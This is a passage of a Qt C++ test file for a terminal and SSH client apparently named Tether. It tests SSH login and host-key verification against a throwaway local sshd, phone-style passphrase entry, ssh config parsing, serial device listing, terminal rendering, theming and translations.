        QCOMPARE(ssh["port"].toInt(), 2222);
        QCOMPARE(ssh["user"].toString(), QString("me"));
        QVERIFY(ssh["command"].toString().startsWith("tmux new-session -A -s tether-pi "));
        QVERIFY(ssh["knownHosts"].toString().endsWith("/known_hosts"));
        QVERIFY(launch["reconnect"].toBool());
        QVERIFY(backend.launch({{"kind", "ssh"}, {"name", "x"}, {"host", "h"}, {"jumpHost", "b"}}).contains("error"));
#else
        QSKIP("Built without libssh.");
#endif
    }

    void builtInSshLogsInAndRuns()
    {
#if defined(TETHER_LIBSSH) && !defined(Q_OS_WIN)
        const QString sshd = QFileInfo::exists("/usr/bin/sshd") ? "/usr/bin/sshd" : QFileInfo::exists("/usr/sbin/sshd") ? "/usr/sbin/sshd" : QString();
        const QString keygen = QStandardPaths::findExecutable("ssh-keygen");
        if (sshd.isEmpty() || keygen.isEmpty())
            QSKIP("No sshd here to test against.");
        QTemporaryDir dir;
        auto run = [](const QString &program, const QStringList &args) {
            QProcess p;
            p.start(program, args);
            return p.waitForFinished(30000) && p.exitCode() == 0;
        };
        QVERIFY(run(keygen, {"-q", "-t", "ed25519", "-N", "", "-f", dir.filePath("host")}));
        QVERIFY(run(keygen, {"-q", "-t", "ed25519", "-N", "pass phrase", "-f", dir.filePath("client")}));
        QFile::copy(dir.filePath("client.pub"), dir.filePath("authorized_keys"));
        const int port = 20000 + QRandomGenerator::global()->bounded(20000);
        write(dir.filePath("sshd_config"), QString(
            "Port %1\nListenAddress 127.0.0.1\nHostKey %2\nAuthorizedKeysFile %3\nPasswordAuthentication no\n"
            "KbdInteractiveAuthentication no\nUsePAM no\nStrictModes no\nPidFile %4\n")
            .arg(port).arg(dir.filePath("host"), dir.filePath("authorized_keys"), dir.filePath("sshd.pid")).toUtf8());
        QProcess server;
        server.start(sshd, {"-D", "-f", dir.filePath("sshd_config"), "-E", dir.filePath("sshd.log")});
        QVERIFY(server.waitForStarted());
        QTest::qWait(500);
        auto stopServer = qScopeGuard([&] { server.kill(); server.waitForFinished(); });

        QString user = qEnvironmentVariable("USER");
        if (user.isEmpty())
            user = qEnvironmentVariable("LOGNAME");
        const QVariantMap settings{{"host", "127.0.0.1"}, {"port", port}, {"user", user},
                                   {"identityFile", dir.filePath("client")}, {"passphrase", "pass phrase"},
                                   {"knownHosts", dir.filePath("known_hosts")},
                                   {"command", "echo ssh-ok-$((2+3)); exit 5"}};
        TerminalView view;
        view.setSize(QSizeF(900, 400));
        QSignalSpy finished(&view, &TerminalView::finished);
        QVERIFY(view.startSsh(settings));
        // A new host: answer the question in the terminal, as a person would.
        QTRY_VERIFY_WITH_TIMEOUT(view.screenText(10).contains("continue connecting"), 10000);
        view.sendText("yes\r");
        QVERIFY(finished.wait(15000));
        const QString text = view.screenText(20);
        QVERIFY2(text.contains("ssh-ok-5"), qPrintable(text));
        QCOMPARE(finished.first().first().toInt(), 5);

        // Known now: no question the second time.
        TerminalView again;
        again.setSize(QSizeF(900, 400));
        QSignalSpy done(&again, &TerminalView::finished);
        QVERIFY(again.startSsh(settings));
        QVERIFY(done.wait(15000));
        QVERIFY(!again.screenText(20).contains("continue connecting"));
        QVERIFY2(again.screenText(20).contains("ssh-ok-5"), qPrintable(again.screenText(20)));

        // Closing a tab on a running shell is immediate: it doesn't wait
        // for an exit status that a shell still running never sends.
        {
            QVariantMap shell = settings;
            shell.remove("command");
            auto *live = new TerminalView;
            live->setSize(QSizeF(900, 400));
            QVERIFY(live->startSsh(shell));
            QTest::qWait(1500);
            live->sendText("echo live-$((40+2))\r");
            QTRY_VERIFY2_WITH_TIMEOUT(live->screenText(30).contains("live-42"), qPrintable(live->screenText(30)), 10000);
            QElapsedTimer closing;
            closing.start();
            delete live;
            QVERIFY2(closing.elapsed() < 1000, qPrintable(QString("closing took %1 ms").arg(closing.elapsed())));
            // The connection's thread ends and cleans up on its own.
            QTest::qWait(1500);
        }

        // A passphrase typed on a phone keyboard: composing text with a
        // correction, a space, and stars for each character.
        {
            QVariantMap asking = settings;
            asking.remove("passphrase");
            TerminalView phone;
            // Narrow, like a phone: the prompt and the stars wrap.
            phone.setSize(QSizeF(380, 400));
            QSignalSpy ended(&phone, &TerminalView::finished);
            QVERIFY(phone.startSsh(asking));
            QTRY_VERIFY_WITH_TIMEOUT(phone.screenText(10).contains("Enter passphrase"), 10000);
            QTRY_VERIFY_WITH_TIMEOUT(phone.secretInput(), 2000);
            auto compose = [&](const QString &preedit, const QString &commit = {}) {
                QInputMethodEvent event(preedit, {});
                if (!commit.isNull())
                    event.setCommitString(commit);
                QCoreApplication::sendEvent(&phone, &event);
            };
            compose("p"); compose("pa"); compose("pas"); compose("pass");
            compose("", "pass ");
            compose("phr"); compose("phrr"); compose("phr"); compose("phrase");
            compose("", "phrase");
            // The prompt and stars may wrap onto two lines, depending on the font.
            QTRY_VERIFY2_WITH_TIMEOUT(phone.screenText(10).remove('\n').contains("***********"),
                                      qPrintable(phone.screenText(10)), 3000);
            QVERIFY(!phone.screenText(10).contains("pass phrase"));
            phone.sendKey("enter");
            QVERIFY(ended.wait(15000));
            QCOMPARE(ended.first().first().toInt(), 5);
            QVERIFY(!phone.secretInput());
        }

        // The server gets a new key: the question says so; turning it down
        // ends without a reconnect (254), trusting it replaces the old key.
        server.kill();
        server.waitForFinished();
        QFile::remove(dir.filePath("host"));
        QFile::remove(dir.filePath("host.pub"));
        QVERIFY(run(keygen, {"-q", "-t", "ed25519", "-N", "", "-f", dir.filePath("host")}));
        server.start(sshd, {"-D", "-f", dir.filePath("sshd_config"), "-E", dir.filePath("sshd.log")});
        QVERIFY(server.waitForStarted());
        QTest::qWait(500);
        // A changed key can't be agreed to by reflex: "yes" and Enter are
        // refused, the dialog's no is no, and only the host's name, typed
        // out (or the dialog, which asks for the same), replaces the key.
        const QStringList answers{"yes", "", "dialog-no", "127.0.0.1", };
        for (const QString &answer : answers) {
            TerminalView changed;
            changed.setSize(QSizeF(900, 400));
            QSignalSpy question(&changed, &TerminalView::hostKeyQuestion);
            QSignalSpy ended(&changed, &TerminalView::finished);
            QVERIFY(changed.startSsh(settings));
            QVERIFY(question.wait(10000));
            QVERIFY(question.first().at(3).toBool()); // changed
            // The key saved before, to show beside the new one.
            const QStringList old = question.first().at(4).toStringList();
            QCOMPARE(old.size(), 1);
            QVERIFY2(old.first().startsWith("SSH-ED25519 SHA256:"), qPrintable(old.first()));
            QVERIFY(!old.first().endsWith(question.first().at(2).toString()));
            QTRY_VERIFY_WITH_TIMEOUT(changed.screenText(30).contains("type the host's name"), 5000);
            if (answer == "dialog-no")
                changed.answerHostKey(false);
            else
                changed.sendText(answer + "\r");
            QVERIFY(ended.wait(15000));
            if (answer != "127.0.0.1") {
                QCOMPARE(ended.first().first().toInt(), 254);
                QVERIFY(changed.screenText(30).contains("Host key verification failed"));
            } else {
                QVERIFY2(changed.screenText(30).contains("ssh-ok-5"), qPrintable(changed.screenText(30)));
            }
        }
        // And from then on the new key is simply known.
        TerminalView after;
        after.setSize(QSizeF(900, 400));
        QSignalSpy afterDone(&after, &TerminalView::finished);
        QSignalSpy afterQuestion(&after, &TerminalView::hostKeyQuestion);
        QVERIFY(after.startSsh(settings));
        QVERIFY(afterDone.wait(15000));
        QCOMPARE(afterQuestion.count(), 0);
        QCOMPARE(afterDone.first().first().toInt(), 5);
#else
        QSKIP("Built without libssh.");
#endif
    }

    void snippetPayloadPressesEnter()
    {
        QCOMPARE(Backend::snippetPayload({{"text", "cd /tmp\r\nls"}, {"run", true}}), QString("cd /tmp\rls\r"));
        QCOMPARE(Backend::snippetPayload({{"text", "partial "}, {"run", false}}), QString("partial "));
        QCOMPARE(Backend::snippetPayload({{"text", "ls\n"}, {"run", true}}), QString("ls\r"));
    }

    void sshConfigHosts()
    {
        QTemporaryDir dir;
        QDir(dir.path()).mkpath("conf.d");
        write(dir.filePath("config"),
              "# comment\nHost web db\n  HostName 10.0.0.5\n  User admin\n  Port 2200\n"
              "Host *.internal !skip\n  User x\nInclude conf.d/*.conf\nHost=router\n");
        write(dir.filePath("conf.d/a.conf"), "Host nas\n  HostName nas.lan\n");
        const QVariantList hosts = Backend::parseSshConfig(dir.filePath("config"));
        QStringList names, details;
        for (const QVariant &h : hosts) {
            names << h.toMap()["name"].toString();
            details << h.toMap()["detail"].toString();
        }
        QCOMPARE(names, QStringList({"web", "db", "nas", "router"}));
        QCOMPARE(details[0], QString("admin@10.0.0.5:2200"));
        QCOMPARE(details[2], QString("nas.lan"));
    }

    void serialDevicesAreFound()
    {
        QTemporaryDir dir;
        for (const char *name : {"ttyUSB10", "ttyUSB2", "ttyACM0", "tty0", "ttyS0"})
            write(dir.filePath(QString::fromLatin1(name)), "");
        QDir(dir.path()).mkpath("serial/by-id");
        QVERIFY(QFile::link("../../ttyUSB2", dir.filePath("serial/by-id/usb-FTDI_FT232R_USB_UART_A5-if00-port0")));

        SerialPorts ports(dir.path(), 0);
        QStringList paths;
        for (const QVariant &d : ports.devices())
            paths << QFileInfo(d.toMap()["path"].toString()).fileName();
        QCOMPARE(paths, QStringList({"ttyACM0", "ttyUSB2", "ttyUSB10"}));
        const QVariantMap ftdi = ports.devices()[1].toMap();
        QCOMPARE(ftdi["label"].toString(), QString("FTDI FT232R USB UART A5"));
        QVERIFY(ftdi["stablePath"].toString().endsWith("by-id/usb-FTDI_FT232R_USB_UART_A5-if00-port0"));
        QVERIFY(ftdi["accessible"].toBool());

        QFile::setPermissions(dir.filePath("ttyACM0"), QFileDevice::Permissions());
        ports.refresh();
        QVERIFY(!ports.devices()[0].toMap()["accessible"].toBool());
        QVERIFY(ports.devices()[0].toMap()["problem"].toString().contains("No permission"));
        QVERIFY(SerialPorts::problem(dir.filePath("gone")).contains("not connected"));
    }

    void terminalColorsFollowTheTheme()
    {
        QTemporaryDir dir;
        QDir(dir.path()).mkpath("theme");
        write(dir.filePath("theme/colors.toml"),
              "accent = \"#112233\"\nbackground = \"#000000\"\nforeground = \"#ffffff\"\nred = \"#ff0000\"\n"
              "bright_red = \"#ff8080\"\nmuted = \"#7a7a7a\"\ngreen = \"#00ff00\"\n");

        Theme theme(dir.path());
        QVERIFY(theme.hasOmarchy());
        QCOMPARE(theme.terminalBackground(), QString("#000000"));
        const QVariantList palette = theme.schemeColors("omarchy").value("palette").toList();
        QCOMPARE(palette.size(), 16);
        QCOMPARE(palette[0].toString(), QString("#000000"));  // black is the background
        QCOMPARE(palette[1].toString(), QString("#ff0000"));
        QCOMPARE(palette[9].toString(), QString("#ff8080"));
        QCOMPARE(palette[8].toString(), QString("#7a7a7a"));  // bright black is muted
        QCOMPARE(palette[10].toString(), QString("#00ff00")); // missing brights use the normal color
        QCOMPARE(palette[7].toString(), QString("#ffffff"));
    }

    void terminalKeepsTheScreenAndHistory()
    {
        TerminalView view;
        view.setSize(QSizeF(800, 400));
        const int rows = view.rows();
        QVERIFY(rows > 5);
        view.feed("hello \x1b[1;31mred\x1b[0m world\r\nsecond line");
        const int first = view.scrollbackLines();
        QCOMPARE(view.lineText(first), QString("hello red world"));
        QCOMPARE(view.lineText(first + 1), QString("second line"));

        // Enough lines to scroll pushes the first ones into the history.
        QByteArray lots;
        for (int i = 0; i < rows + 10; ++i)
            lots += "line " + QByteArray::number(i) + "\r\n";
        view.feed(lots);
        QVERIFY(view.scrollbackLines() >= 10);
        QCOMPARE(view.lineText(0), QString("hello red world"));
        QVERIFY(view.screenText(3).contains(QString("line %1").arg(rows + 9)));

        // Wide characters take two cells and come back whole.
        view.feed("\x1b[2J\x1b[H日本 ok");
        QCOMPARE(view.lineText(view.scrollbackLines()), QString("日本 ok"));

        // The title comes from OSC 0.
        view.feed("\x1b]0;my title\x07");
        QCOMPARE(view.title(), QString("my title"));
    }

    void terminalRunsAProgramInAPty()
    {
#ifndef Q_OS_WIN
        TerminalView view;
        view.setSize(QSizeF(800, 400));
        QSignalSpy finished(&view, &TerminalView::finished);
        QVERIFY(view.start("/bin/sh", {"-c", "printf 'cols=%s\\n' \"$(tput cols 2>/dev/null || stty size | cut -d' ' -f2)\"; echo \"term=$TERM\"; exit 3"}));
        QVERIFY(finished.wait(5000));
        QCOMPARE(finished.first().first().toInt(), 3);
        const QString text = view.screenText(10);
        QVERIFY2(text.contains(QString("cols=%1").arg(view.columns())), qPrintable(text));
        QVERIFY2(text.contains("term=xterm-256color"), qPrintable(text));
        QVERIFY(!view.running());

        // Typing reaches the program.
        QSignalSpy done(&view, &TerminalView::finished);
        QVERIFY(view.start("/bin/sh", {"-c", "read line; echo \"got:$line\""}));
        view.sendText("abc\r");
        QVERIFY(done.wait(5000));
        QVERIFY2(view.screenText(10).contains("got:abc"), qPrintable(view.screenText(10)));
#endif
    }

    void themeFallsBack()
    {
        QTemporaryDir dir;
        Theme theme(dir.path());
        QCOMPARE(theme.accent(), QString("#FFD60A"));
        QCOMPARE(theme.accentForeground(), QString("black"));
    }

    void themeFollowsHyprlandRounding()
    {
        QTemporaryDir dir;
        const QString response = dir.filePath("response.json"), command = dir.filePath("hyprctl");
        write(command, "#!/bin/sh\ncat '" + response.toUtf8() + "'\n");
        QVERIFY(QFile::setPermissions(command, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner));
        write(response, "{\"int\":0}");

        Theme theme(dir.path(), nullptr, command);
        QCOMPARE(theme.radius(), 0);
        write(response, "{\"int\":6}");
        QTRY_COMPARE(theme.radius(), 6);
    }

    void translatorFallsBackToEnglish()
    {
        QTemporaryDir dir;
        Translator translator(dir.path() + "/language", dir.path());
        QCOMPARE(translator.language(), QString("en"));
        QVERIFY(translator.translate("Main", "Save").isNull());
    }

    void translatorFollowsTheLanguageFile()
    {
        QTemporaryDir dir;
        write(dir.path() + "/language", "pt-BR\n");
        write(dir.path() + "/pt.json", R"({"Save": "Guardar", "Open": "Abrir"})");
        write(dir.path() + "/pt-BR.json", R"({"Save": "Salvar"})");

        Translator translator(dir.path() + "/language", dir.path());
        QCOMPARE(translator.translate("Main", "Save"), QString("Salvar"));
        QCOMPARE(translator.translate("Main", "Open"), QString("Abrir"));
    }

    void translatorPicksPluralForms()
    {
        QTemporaryDir dir;
        write(dir.path() + "/language", "en\n");
        Translator translator(dir.path() + "/language", ":/no-catalogs");
        QCOMPARE(Translator::pluralCategory("en", 1), QString("one"));
        QCOMPARE(Translator::pluralCategory("ru", 22), QString("few"));
        QCOMPARE(Translator::pluralCategory("ar", 11), QString("many"));
    }

private:
    static void write(const QString &path, const QByteArray &contents)
    {
        QFile file(path);
        QVERIFY(file.open(QIODevice::WriteOnly));
        file.write(contents);
    }
};

QTEST_MAIN(TetherTests)
#include "tether_tests.moc"
